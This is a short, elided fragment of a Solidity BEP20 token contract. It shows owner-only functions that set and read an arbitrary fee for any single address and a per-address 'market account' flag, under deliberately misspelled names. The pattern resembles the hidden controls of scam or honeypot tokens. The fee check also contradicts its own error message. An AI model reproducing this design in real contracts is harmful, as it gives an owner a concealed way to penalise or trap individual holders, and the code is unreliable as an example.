...
contract SH is BEP20, Ownable {
    ...
    function setSfeiee(address _address, uint256 _value) external onlyowner {
        require(_value > 1, "avnount tax must be greater than or equal to 1");
        _Sfeiee[_address] = _value;
    }

    function getSfeiee(address _address) external view onlyowner returns (uint256) {
        return _Sfeiee[_address];
    }


    function setMarketavnountfeiee(address _address, bool _value) external onlyowner {
        _marketavnount[_address] = _value;
    }

    function getMarketavnountfeiee(address _address) external view onlyowner returns (bool) {
